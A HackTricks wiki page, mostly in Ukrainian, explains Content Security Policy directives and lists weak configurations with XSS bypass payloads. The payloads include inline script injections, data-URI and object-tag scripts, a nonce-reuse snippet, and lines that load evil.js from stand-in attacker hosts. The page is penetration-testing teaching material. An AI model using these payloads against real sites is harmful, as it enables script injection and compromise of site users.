# Content Security Policy (CSP) Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## What is CSP

Content Security Policy (CSP) –≤–≤–∞–∂–∞—î—Ç—å—Å—è —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—î—é –±—Ä–∞—É–∑–µ—Ä–∞, —è–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É —Å–ø—Ä—è–º–æ–≤–∞–Ω–∞ –Ω–∞ **–∑–∞—Ö–∏—Å—Ç –≤—ñ–¥ –∞—Ç–∞–∫, —Ç–∞–∫–∏—Ö —è–∫ –º—ñ–∂—Å–∞–π—Ç–æ–≤–∏–π —Å–∫—Ä–∏–ø—Ç–∏–Ω–≥ (XSS)**. –í–æ–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω—É—î, –≤–∏–∑–Ω–∞—á–∞—é—á–∏ —Ç–∞ –¥–µ—Ç–∞–ª—ñ–∑—É—é—á–∏ —à–ª—è—Ö–∏ —Ç–∞ –¥–∂–µ—Ä–µ–ª–∞, –∑ —è–∫–∏—Ö —Ä–µ—Å—É—Ä—Å–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –±–µ–∑–ø–µ—á–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –±—Ä–∞—É–∑–µ—Ä–æ–º. –¶—ñ —Ä–µ—Å—É—Ä—Å–∏ –æ—Ö–æ–ø–ª—é—é—Ç—å —Ä—è–¥ –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, —Ñ—Ä–µ–π–º–∏ —Ç–∞ JavaScript. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–æ–ª—ñ—Ç–∏–∫–∞ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤ –∑ —Ç–æ–≥–æ –∂ –¥–æ–º–µ–Ω—É (self), –≤–∫–ª—é—á–∞—é—á–∏ –≤–±—É–¥–æ–≤–∞–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏ —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ä—è–¥–∫–æ–≤–æ–≥–æ –∫–æ–¥—É —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ `eval`, `setTimeout` –∞–±–æ `setInterval`.

–í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è CSP –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è —á–µ—Ä–µ–∑ **–∑–∞–≥–æ–ª–æ–≤–∫–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ** –∞–±–æ —à–ª—è—Ö–æ–º –≤–∫–ª—é—á–µ–Ω–Ω—è **–º–µ—Ç–∞-–µ–ª–µ–º–µ–Ω—Ç—ñ–≤ —É HTML-—Å—Ç–æ—Ä—ñ–Ω–∫—É**. –î–æ—Ç—Ä–∏–º—É—é—á–∏—Å—å —Ü—ñ—î—ó –ø–æ–ª—ñ—Ç–∏–∫–∏, –±—Ä–∞—É–∑–µ—Ä–∏ –∞–∫—Ç–∏–≤–Ω–æ –∑–∞–±–µ–∑–ø–µ—á—É—é—Ç—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü–∏—Ö –≤–∏–º–æ–≥ —ñ –Ω–µ–≥–∞–π–Ω–æ –±–ª–æ–∫—É—é—Ç—å –±—É–¥—å-—è–∫—ñ –≤–∏—è–≤–ª–µ–Ω—ñ –ø–æ—Ä—É—à–µ–Ω–Ω—è.

* Implemented via response header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* –†–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ —á–µ—Ä–µ–∑ –º–µ—Ç–∞-—Ç–µ–≥:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Headers

CSP –º–æ–∂–µ –±—É—Ç–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–∏–π –∞–±–æ –º–æ–Ω—ñ—Ç–æ—Ä–µ–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü–∏—Ö –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤:

* `Content-Security-Policy`: –ó–∞—Å—Ç–æ—Å–æ–≤—É—î CSP; –±—Ä–∞—É–∑–µ—Ä –±–ª–æ–∫—É—î –±—É–¥—å-—è–∫—ñ –ø–æ—Ä—É—à–µ–Ω–Ω—è.
* `Content-Security-Policy-Report-Only`: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É; –ø–æ–≤—ñ–¥–æ–º–ª—è—î –ø—Ä–æ –ø–æ—Ä—É—à–µ–Ω–Ω—è –±–µ–∑ —ó—Ö –±–ª–æ–∫—É–≤–∞–Ω–Ω—è. –Ü–¥–µ–∞–ª—å–Ω–æ –ø—ñ–¥—Ö–æ–¥–∏—Ç—å –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö –ø–µ—Ä–µ–¥ –≤–∏–ø—É—Å–∫–æ–º.

### Defining Resources

CSP –æ–±–º–µ–∂—É—î –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —è–∫ –∞–∫—Ç–∏–≤–Ω–æ–≥–æ, —Ç–∞–∫ —ñ –ø–∞—Å–∏–≤–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É, –∫–æ–Ω—Ç—Ä–æ–ª—é—é—á–∏ –∞—Å–ø–µ–∫—Ç–∏, —Ç–∞–∫—ñ —è–∫ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–±—É–¥–æ–≤–∞–Ω–æ–≥–æ JavaScript —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `eval()`. –ü—Ä–∏–∫–ª–∞–¥ –ø–æ–ª—ñ—Ç–∏–∫–∏:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### –î–∏—Ä–µ–∫—Ç–∏–≤–∏

* **script-src**: –î–æ–∑–≤–æ–ª—è—î –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è JavaScript, –≤–∫–ª—é—á–∞—é—á–∏ URL-–∞–¥—Ä–µ—Å–∏, –≤–±—É–¥–æ–≤–∞–Ω—ñ —Å–∫—Ä–∏–ø—Ç–∏ —Ç–∞ —Å–∫—Ä–∏–ø—Ç–∏, —â–æ –≤–∏–∫–ª–∏–∫–∞—é—Ç—å—Å—è –æ–±—Ä–æ–±–Ω–∏–∫–∞–º–∏ –ø–æ–¥—ñ–π –∞–±–æ XSLT-—Å—Ç–∏–ª—è–º–∏.
* **default-src**: –í—Å—Ç–∞–Ω–æ–≤–ª—é—î —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É –ø–æ–ª—ñ—Ç–∏–∫—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤, –∫–æ–ª–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –¥–∏—Ä–µ–∫—Ç–∏–≤–∏ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤—ñ–¥—Å—É—Ç–Ω—ñ.
* **child-src**: –í–∫–∞–∑—É—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏ –¥–ª—è –≤–µ–±-—Ä–æ–±—ñ—Ç–Ω–∏–∫—ñ–≤ —Ç–∞ –≤–±—É–¥–æ–≤–∞–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É —Ñ—Ä–µ–π–º—ñ–≤.
* **connect-src**: –û–±–º–µ–∂—É—î URL-–∞–¥—Ä–µ—Å–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ fetch, WebSocket, XMLHttpRequest.
* **frame-src**: –û–±–º–µ–∂—É—î URL-–∞–¥—Ä–µ—Å–∏ –¥–ª—è —Ñ—Ä–µ–π–º—ñ–≤.
* **frame-ancestors**: –í–∫–∞–∑—É—î, —è–∫—ñ –¥–∂–µ—Ä–µ–ª–∞ –º–æ–∂—É—Ç—å –≤–±—É–¥–æ–≤—É–≤–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –¥–æ –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ `<frame>`, `<iframe>`, `<object>`, `<embed>`, —ñ `<applet>`.
* **img-src**: –í–∏–∑–Ω–∞—á–∞—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è –∑–æ–±—Ä–∞–∂–µ–Ω—å.
* **font-src**: –í–∫–∞–∑—É—î –¥—ñ–π—Å–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è —à—Ä–∏—Ñ—Ç—ñ–≤, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `@font-face`.
* **manifest-src**: –í–∏–∑–Ω–∞—á–∞—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ —Ñ–∞–π–ª—ñ–≤ –º–∞–Ω—ñ—Ñ–µ—Å—Ç—É –¥–æ–¥–∞—Ç–∫–∞.
* **media-src**: –í–∏–∑–Ω–∞—á–∞—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–µ–¥—ñ–∞-–æ–±'—î–∫—Ç—ñ–≤.
* **object-src**: –í–∏–∑–Ω–∞—á–∞—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ `<object>`, `<embed>`, —ñ `<applet>`.
* **base-uri**: –í–∫–∞–∑—É—î –¥–æ–∑–≤–æ–ª–µ–Ω—ñ URL-–∞–¥—Ä–µ—Å–∏ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ `<base>`.
* **form-action**: –ü–µ—Ä–µ—Ä–∞—Ö–æ–≤—É—î –¥—ñ–π—Å–Ω—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º.
* **plugin-types**: –û–±–º–µ–∂—É—î mime-—Ç–∏–ø–∏, —è–∫—ñ –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Å—Ç–æ—Ä—ñ–Ω–∫–∞.
* **upgrade-insecure-requests**: –Ü–Ω—Å—Ç—Ä—É–∫—Ç—É—î –±—Ä–∞—É–∑–µ—Ä–∏ –ø–µ—Ä–µ–ø–∏—Å—É–≤–∞—Ç–∏ HTTP URL-–∞–¥—Ä–µ—Å–∏ –Ω–∞ HTTPS.
* **sandbox**: –ó–∞—Å—Ç–æ—Å–æ–≤—É—î –æ–±–º–µ–∂–µ–Ω–Ω—è, –ø–æ–¥—ñ–±–Ω—ñ –¥–æ –∞—Ç—Ä–∏–±—É—Ç–∞ sandbox –µ–ª–µ–º–µ–Ω—Ç–∞ `<iframe>`.
* **report-to**: –í–∫–∞–∑—É—î –≥—Ä—É–ø—É, –¥–æ —è–∫–æ—ó –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –∑–≤—ñ—Ç, —è–∫—â–æ –ø–æ–ª—ñ—Ç–∏–∫–∞ –±—É–¥–µ –ø–æ—Ä—É—à–µ–Ω–∞.
* **worker-src**: –í–∫–∞–∑—É—î –¥—ñ–π—Å–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è —Å–∫—Ä–∏–ø—Ç—ñ–≤ Worker, SharedWorker –∞–±–æ ServiceWorker.
* **prefetch-src**: –í–∫–∞–∑—É—î –¥—ñ–π—Å–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è —Ä–µ—Å—É—Ä—Å—ñ–≤, —è–∫—ñ –±—É–¥—É—Ç—å –æ—Ç—Ä–∏–º–∞–Ω—ñ –∞–±–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –æ—Ç—Ä–∏–º–∞–Ω—ñ.
* **navigate-to**: –û–±–º–µ–∂—É—î URL-–∞–¥—Ä–µ—Å–∏, –¥–æ —è–∫–∏—Ö –¥–æ–∫—É–º–µ–Ω—Ç –º–æ–∂–µ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–º —Å–ø–æ—Å–æ–±–æ–º (a, —Ñ–æ—Ä–º–∞, window.location, window.open —Ç–æ—â–æ).

### –î–∂–µ—Ä–µ–ª–∞

* `*`: –î–æ–∑–≤–æ–ª—è—î –≤—Å—ñ URL-–∞–¥—Ä–µ—Å–∏, –∫—Ä—ñ–º —Ç–∏—Ö, —â–æ –º–∞—é—Ç—å —Å—Ö–µ–º–∏ `data:`, `blob:`, `filesystem:`.
* `'self'`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑ —Ç–æ–≥–æ –∂ –¥–æ–º–µ–Ω—É.
* `'data'`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤ —á–µ—Ä–µ–∑ —Å—Ö–µ–º—É –¥–∞–Ω–∏—Ö (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, –∑–∞–∫–æ–¥–æ–≤–∞–Ω—ñ –≤ Base64).
* `'none'`: –ë–ª–æ–∫—É—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑ –±—É–¥—å-—è–∫–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞.
* `'unsafe-eval'`: –î–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `eval()` —Ç–∞ –ø–æ–¥—ñ–±–Ω–∏—Ö –º–µ—Ç–æ–¥—ñ–≤, –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –∑ –º—ñ—Ä–∫—É–≤–∞–Ω—å –±–µ–∑–ø–µ–∫–∏.
* `'unsafe-hashes'`: –î–æ–∑–≤–æ–ª—è—î –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –≤–±—É–¥–æ–≤–∞–Ω—ñ –æ–±—Ä–æ–±–Ω–∏–∫–∏ –ø–æ–¥—ñ–π.
* `'unsafe-inline'`: –î–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ –≤–±—É–¥–æ–≤–∞–Ω—ñ `<script>` –∞–±–æ `<style>`, –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –∑ –º—ñ—Ä–∫—É–≤–∞–Ω—å –±–µ–∑–ø–µ–∫–∏.
* `'nonce'`: –°–ø–∏—Å–æ–∫ –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö —Å–∫—Ä–∏–ø—Ç—ñ–≤, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ—ñ—á–Ω–∏–π nonce (—á–∏—Å–ª–æ, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –æ–¥–∏–Ω —Ä–∞–∑).
* –Ø–∫—â–æ —É –≤–∞—Å –æ–±–º–µ–∂–µ–Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è JS, –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π nonce –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `doc.defaultView.top.document.querySelector("[nonce]")` —ñ –ø–æ—Ç—ñ–º –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ (—è–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è strict-dynamic, –±—É–¥—å-—è–∫–µ –¥–æ–∑–≤–æ–ª–µ–Ω–µ –¥–∂–µ—Ä–µ–ª–æ –º–æ–∂–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–æ–≤—ñ –¥–∂–µ—Ä–µ–ª–∞, —Ç–æ–º—É —Ü–µ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ), —è–∫ —É:

<details>

<summary>–ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç, –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: –î–æ–∑–≤–æ–ª—è—î —Å–∫—Ä–∏–ø—Ç–∏ –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º sha256 —Ö–µ—à–µ–º.
* `'strict-dynamic'`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç—ñ–≤ –∑ –±—É–¥—å-—è–∫–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞, —è–∫—â–æ –≤–æ–Ω–æ –±—É–ª–æ –≤–Ω–µ—Å–µ–Ω–æ –¥–æ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é nonce –∞–±–æ —Ö–µ—à—É.
* `'host'`: –í–∫–∞–∑—É—î –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π —Ö–æ—Å—Ç, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `example.com`.
* `https:`: –û–±–º–µ–∂—É—î URL-–∞–¥—Ä–µ—Å–∏ —Ç–∏–º–∏, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å HTTPS.
* `blob:`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤ –∑ Blob URL (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, Blob URL, —Å—Ç–≤–æ—Ä–µ–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é JavaScript).
* `filesystem:`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤ –∑ —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏.
* `'report-sample'`: –í–∫–ª—é—á–∞—î –∑—Ä–∞–∑–æ–∫ –ø–æ—Ä—É—à—É—é—á–æ–≥–æ –∫–æ–¥—É —É –∑–≤—ñ—Ç –ø—Ä–æ –ø–æ—Ä—É—à–µ–Ω–Ω—è (–∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –Ω–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è).
* `'strict-origin'`: –°—Ö–æ–∂–µ –Ω–∞ 'self', –∞–ª–µ –∑–∞–±–µ–∑–ø–µ—á—É—î, —â–æ–± —Ä—ñ–≤–µ–Ω—å –±–µ–∑–ø–µ–∫–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª—É –¥–∂–µ—Ä–µ–ª –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–≤ –¥–æ–∫—É–º–µ–Ω—Ç—É (—Ç—ñ–ª—å–∫–∏ –±–µ–∑–ø–µ—á–Ω—ñ –¥–∂–µ—Ä–µ–ª–∞ –º–æ–∂—É—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ä–µ—Å—É—Ä—Å–∏ –∑ –±–µ–∑–ø–µ—á–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª).
* `'strict-origin-when-cross-origin'`: –ù–∞–¥—Å–∏–ª–∞—î –ø–æ–≤–Ω—ñ URL-–∞–¥—Ä–µ—Å–∏ –ø—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ –∑–∞–ø–∏—Ç—ñ–≤ –∑ –æ–¥–Ω–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞, –∞–ª–µ –ª–∏—à–µ –Ω–∞–¥—Å–∏–ª–∞—î –¥–∂–µ—Ä–µ–ª–æ, –∫–æ–ª–∏ –∑–∞–ø–∏—Ç —î –∫—Ä–æ—Å-–¥–æ–º–µ–Ω–Ω–∏–º.
* `'unsafe-allow-redirects'`: –î–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤, —è–∫—ñ –Ω–µ–≥–∞–π–Ω–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç—å –Ω–∞ —ñ–Ω—à–∏–π —Ä–µ—Å—É—Ä—Å. –ù–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –ø–æ—Å–ª–∞–±–ª—é—î –±–µ–∑–ø–µ–∫—É.

## –ù–µ–±–µ–∑–ø–µ—á–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞ CSP

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Working payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' —á–µ—Ä–µ–∑ Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

{% hint style="danger" %}
–¶–µ –Ω–µ –ø—Ä–∞—Ü—é—î, –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó [**–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
{% endhint %}
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
–ü—Ä–∞—Ü—é—é—á–∞ –∫–æ—Ä–∏—Å–Ω–∞ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

–Ø–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º –∑–º—É—Å–∏—Ç–∏ **–¥–æ–∑–≤–æ–ª–µ–Ω–∏–π JS –∫–æ–¥ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π —Ç–µ–≥ —Å–∫—Ä–∏–ø—Ç–∞** –≤ DOM –∑ –≤–∞—à–∏–º JS –∫–æ–¥–æ–º, –æ—Å–∫—ñ–ª—å–∫–∏ –π–æ–≥–æ —Å—Ç–≤–æ—Ä—é—î –¥–æ–∑–≤–æ–ª–µ–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, **–Ω–æ–≤–∏–π —Ç–µ–≥ —Å–∫—Ä–∏–ø—Ç–∞ –±—É–¥–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
–ü—Ä–∞—Ü—é—é—á–∞ –∫–æ—Ä–∏—Å–Ω–∞ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å object-src —Ç–∞ default-src

{% hint style="danger" %}
**–°—Ö–æ–∂–µ, —â–æ —Ü–µ –±—ñ–ª—å—à–µ –Ω–µ –ø—Ä–∞—Ü—é—î**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
–ü—Ä–∞—Ü—é—é—á—ñ –∫–æ—Ä–∏—Å–Ω—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
